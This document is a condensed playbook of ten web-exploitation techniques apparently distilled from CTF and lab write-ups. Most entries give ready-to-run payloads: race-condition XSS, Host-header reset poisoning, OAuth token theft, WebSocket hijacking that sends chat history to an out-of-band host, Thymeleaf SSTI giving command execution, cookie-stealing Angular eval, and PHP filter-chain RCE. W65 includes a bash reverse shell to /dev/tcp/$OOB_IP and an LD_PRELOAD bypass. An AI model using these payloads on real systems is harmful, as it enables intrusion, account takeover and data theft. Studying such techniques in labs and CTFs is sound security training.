# Writeup-Distilled Patterns W59–W68 — race / OAuth / WS / SSTI / filter-chain (R2)

## W59 — Bot-lockfile race + `max_input_vars` CSP-drop
Signals: PHP `report.php` + `bot.lock` makeshift lockfile (`if exists exit`); `index.php?html=` reflects with `Content-Security-Policy`; YAML `NO`→`false` currency quirk.
Steps: 1) fire 2 parallel `POST /report.php url=<xss>` — first creates lock, second passes before `unlink`, both bots run; 2) alt: `GET /index.php?html=<script>...&a0=0&...&a1001=0` (1001 vars → `Input variables exceeded 1000` → headers-already-sent → NO CSP); 3) bot POSTs `admin.php` YAML `country=FLAG` (NO-rate 0) to buy flag.
```bash
seq 1 2 | xargs -P2 -I{} curl -sS -X POST $URL/report.php -d 'url=http://$HOST/index.php?html=<script>fetch("/admin.php",{method:"POST"})</script>'
curl -sS "$URL/index.php?html=<script>alert(1)</script>&$(seq -s '&' 0 1001 | sed 's/[0-9]*/&=0/g')" -D - | grep -i '^content-security-policy' || echo 'CSP dropped'
```
Pitfalls: sequential Intruder misses lock window — must be parallel `-P2`; `NO` must be bare (not `Norway`) for falsy rate.
Sources: https://jia.je/ctf-writeups/2025-09-07-blackhat-mea-ctf-quals-2025/cute-csp.html | https://github.com/Govamarket/Coupon-Redemption | https://siunam321.github.io/ctf/portswigger-labs/race-conditions/race-conditions-2/

## W60 — OAuth `redirect_uri` + Host-reset + `temp_token` 2FA leak
Signals: `resetLink=http://${host}/reset-password/${token}`; OAuth `redirect_uri` whitelist loose (`/oauth-callback/../post?` traversal + `/post/next?path=` open redirect); `temp_token` JWT opens `/admin/2fa-setup`.
Steps: 1) `POST /forgot-password Host: attacker.com` → admin reset → takeover; 2) login → capture `temp_token` → `GET /admin/2fa-setup` → TOTP secret → full admin; 3) OAuth: `redirect_uri=https://$HOST/oauth-callback/../post/next?path=https://$OOB/exploit` → code/token to collaborator → `/me` with stolen Bearer → API key.
```bash
curl -sS -X POST $URL/forgot-password -H 'Host: attacker.com' -d 'email=admin@x.y'
curl -sS "$URL/admin/2fa-setup" -H "Authorization: Bearer $TEMP" | grep -oiE 'secret[^,]{0,40}'
```
Pitfalls: `temp_token` ≠ session — replay in right header; OAuth `response_type=token` puts token in fragment — need JS exfil (`location.hash`), not server log.
Sources: https://bountysecurity.ai/blogs/news/oauth-open-redirect-to-account-takeover-pentest-case | https://securityblog.omegapoint.se/en/writeup-authentik-cve-2024-52289/ | https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect

## W61 — Cross-site WebSocket hijacking (CSWSH) `READY` exfil
Signals: `wss://$HOST/chat` + `101 Switching Protocols`; handshake uses cookies only, no `Origin` check, `setAllowedOrigins("*")`; client sends `READY` → server returns history.
Steps: 1) Repeater clone handshake, set `Origin: https://evil.net` — 101 = vulnerable; 2) host `<script>ws=new WebSocket('wss://$HOST/chat');ws.onopen=()=>ws.send('READY');ws.onmessage=e=>fetch('https://$OOB?m='+btoa(e.data))</script>`; 3) victim visit → history to collaborator.
```html
<script>var ws=new WebSocket('wss://$HOST/chat');ws.onopen=function(){ws.send('READY')};ws.onmessage=function(e){fetch('https://$OOB/exploit?m='+btoa(e.data))};</script>
```
Pitfalls: `SameSite=Lax` (default) blocks Chrome — need `SameSite=None` cookie; Firefox Total-Cookie-Protection blocks even `None` — target Chrome; `wss://` vs `ws://` mismatch fails handshake.
Sources: https://4ykh4ncyb3r.github.io/posts/lab03_websockets/ | https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/ | https://pentest-tools.com/blog/cross-site-websocket-hijacking-cswsh

## W62 — Thymeleaf SSTI-to-SSTI via `#ctx` TemplateManager
Signals: Spring Boot 3.3+ / Thymeleaf 3.1.x, `Referer` reflected in `th:text="@{'/login?redirectAfterLogin=__${Referer}__'}"`; `T(...)/new` blocked (`Instantiation forbidden`).
Steps: 1) confirm `__${7*7}__` → `49` (double-eval); 2) `"" .class.forName("org.apache.commons.lang3.reflect.MethodUtils")` (non-denylisted) → `invokeStaticMethod(Runtime,"getRuntime")` → `invokeMethod(...,"exec",#ctx...getHeader("CMD"))`; 3) file-writeback for blind: `...getResponse().getWriter().println(IOUtils.toString(FileUtils.readFileToString("abc")))`.
```text
'+${"".class.forName("org.apache.commons.lang3.reflect.MethodUtils").invokeMethod("".class.forName("org.apache.commons.lang3.reflect.MethodUtils").invokeStaticMethod("".class.forName("java.lang.Runtime"),"getRuntime"),"exec",#ctx.getVariable("org.springframework.web.context.request.async.WebAsyncManager.WEB_ASYNC_MANAGER").getAsyncWebRequest().getHeader("CMD"))}+' 
```
Pitfalls: `org.springframework.util.*` now denylisted — use `org.apache.commons.lang3`; `getRuntime` direct-call forbidden — must go via `MethodUtils.invokeMethod`.
Sources: https://borelenzo.github.io/stuff/2025/04/26/bypassing-thymeleaf-3.1.3-sandbox.html | https://modzero.com/en/blog/spring_boot_ssti/ | https://www.ctfiot.com/159451.html

## W63 — `escapeHTML(length)` split + minifier-newline bypass
Signals: `POST /render {html, initialLength, formattedLength}` + `escapeHTML(html, formattedLength)` with `if (length<html.length) escaped+=html.slice(length)`; client `html-minifier` strips newlines except in `<!-- -->`; `<%- escapedHtml %>` unescaped in EJS.
Steps: 1) pad `<!--\n...\n-->` (381 newlines) so minified `formattedLength` < raw `html.length` — tail passes unsanitized; 2) tail = `<script src="/redirect?url=https://cdnjs.../angular.js"></script><div ng-app ng-csp>{{$on.curry.call().eval(...)}}</div>`; 3) `/share` triggers bot.
```html
<!-- (381x newline) --><script src="/redirect?url=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script><div ng-app ng-csp>{{$on.curry.call().eval("window.location='https://$OOB?c='+document.cookie")}}</div>
```
Pitfalls: newline count must exceed minifier delta — binary-search 100/200/400; `html-minifier` version differs — test locally first.
Sources: https://infosecwriteups.com/compress-a-thon-web-exploitation-pentathon-2025-fea9adf9fa6b | https://maajix.github.io/ctfs/crewctf-2025/ | https://siunam321.github.io/ctf/portswigger-labs/Cross-Site-Scripting/xss-4/

## W64 — PHP filter-chain via CVE-2024-2961 `ISO-2022-CN-EXT` overflow
Signals: `?file=` LFI + `php://filter` works; classic `php_filter_chain_generator` RCE fails (patched `convert.*` counting?); PHP + glibc `iconv` with `ISO-2022-CN-EXT`.
Steps: 1) confirm `convert.iconv.UTF8.ISO-2022-CN-EXT` expands 3-byte `劄` → 4 bytes (heap over-read); 2) chain `file_get_contents($file)` with crafted `filter` to overflow `outbuf` → adjacent heap control; 3) `/proc/self/maps` → libc → `system` → RCE (use public CVE-2024-2961 PoC, single shot).
```bash
python3 php_filter_chain_generator.py --chain '<?php system("cat /flag*");?>' | grep '^php' > chain.txt
curl -sS "$URL/index.php?file=$(cat chain.txt)" | grep -oiE 'flag[^<]{0,60}'
```
Pitfalls: `memory_limit=128M` side-channel variant differs — confirm overflow (`500` vs `200`) before RCE PoC; LFI must use `include/file_get_contents`, not `readfile`-only.
Sources: https://err0r233.github.io/posts/28510.html | https://n0el4kls.github.io/posts/15-phpfilterchainstudy/ | https://nginx0.github.io/posts/tryhackme-cheese_ctf/

## W65 — Filter-chain RCE + `disable_functions` `LD_PRELOAD/mail` bypass
Signals: filter-chain RCE works but `system/exec/popen/shell_exec` → `Call to undefined function`; `putenv` + `mail` allowed; container with gcc.
Steps: 1) filter-chain `<?=eval($_GET[0])?>` → code-exec; 2) upload `shell.c` (`__attribute__((constructor))` → reverse shell), `gcc -shared -o /tmp/x.so shell.c`; 3) `putenv('LD_PRELOAD=/tmp/x.so'); mail('','','','');` → `sendmail` loads `.so`.
```php
putenv('LD_PRELOAD=/tmp/x.so'); mail('a@b.c','','','');
```
```c
__attribute__((constructor)) void p(){ system("bash -c 'bash -i >& /dev/tcp/$OOB_IP/443 0>&1'"); }
```
Pitfalls: `LD_PRELOAD` ignored for setuid — need non-setuid `sendmail`; `/tmp` noexec kills `.so` — use `/dev/shm`.
Sources: https://matty69v.app/posts/tryhackme-moebius/ | https://avishaigonen123.github.io/CTF_writeups/websec.il/TryMe/ | https://dsec.blog/sniper-htb/

## W66 — DOMPurify Unicode-overflow tag smuggle
Signals: note `POST /create` → DOMPurify → base64-store → ascii-decode render; `<script>` stripped but `ļ/ľ` (U+013B/U+013E) survive; CSP needs redirect-gadget anyway.
Steps: 1) submit `ļscript src="http://$HOST/redirect?url=https://cdnjs.../angular.min.js" ľ ļ/script ľ` — stored as-is; 2) render decodes `ļ`→`<` after sanitize → live `<script>`; 3) Angular `{{constructor.constructor(...)}}` for CSP bypass (see W50).
```text
ļscript src="http://$HOST/redirect?url=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js" ľ  ļ/script ľ
```
Pitfalls: UTF-8 vs ascii decode mismatch — confirm `ļ` (0xC4 0xBB) overflows to `<` (0x3C) on target Python version; double-submit re-encodes — single store, single render.
Sources: https://adamzvara.github.io/writeups/writeups/2025/BITSCTF/Get-Into-My-Cute-Small-Planner.html | https://infosecwriteups.com/compress-a-thon-web-exploitation-pentathon-2025-fea9adf9fa6b | https://siunam321.github.io/ctf/portswigger-labs/Cross-Site-Scripting/xss-5/

## W67 — `X-Forwarded-For` blind SQLi via SQLite `ESCAPE ''` oracle
Signals: login form WAF-bans IP on `'` (ban page ~765B); `X-Forwarded-For` logged unsanitized; SQLite backend.
Steps: 1) `X-Forwarded-For: 1'` → 712B vs 753B normal = injectable header; 2) oracle `0'||(CASE WHEN <cond> THEN ('a' LIKE 'a' ESCAPE '') ELSE 0 END)||'` — true = error-short (≤720B); 3) script `sqlite_master` → `pragma_table_info` → `users` dump.
```python
def probe(cond):
    p = f"0'||(CASE WHEN {cond} THEN ('a' LIKE 'a' ESCAPE '') ELSE 0 END)||'"
    return len(requests.post(URL, headers={"X-Forwarded-For": p}, data={"user":"a","pass":"a"}).text) <= 720
```
Pitfalls: 2x `429`/ban = stop 10 min (F2); `LIKE ... ESCAPE ''` MySQL differs — SQLite-only.
Sources: https://ctf.zeba.dev/2025/martina-ctf/web/possibly-secure-2003-webapp/writeup/ | https://emc2hf.github.io/blog/2025/08/17/how-i-successfully-bypassed-wordfence-to-exploit-sqli-in-a-clients-wordpress/ | https://siunam321.github.io/ctf/portswigger-labs/SQL-Injection/sqli-2/

## W68 — Hash-length-extension file-integrity + array-join SQLi bypass
Signals: `md5(secret||filename)` integrity, client-side score hash leaked in JS; WAF blacklist exact-ASCII (`prepare_query` joins arrays with `" ".join(data)`); Unicode ligature `ﬂ` (U+FB02) unnormalized.
Steps: 1) length-extension `md5(secret||file)` → `md5(secret||file||padding||/traversal)` for extra read; 2) `{"word":["fl'||","'ag"]}` → joined `fl'|| 'ag` → `flag`; 3) if joined-check fixed: `["\ufb02","x'--"]` (ligature ≠ `flag`, DB normalizes).
```json
{"word": ["fl'||", "'ag"]}
{"word": ["\ufb02ag'--", "x"]}
```
Pitfalls: hash-extension needs original length — brute 8-64; ligature normalization DB-specific — test `ﬂ`→`fl` first.
Sources: https://0xnayel.com/publications/cat-ctf-25-web-writeups | https://siunam321.github.io/ctf/portswigger-labs/Access-Control/ac-3/ | https://siunam321.github.io/ctf/portswigger-labs/SQL-Injection/sqli-3/
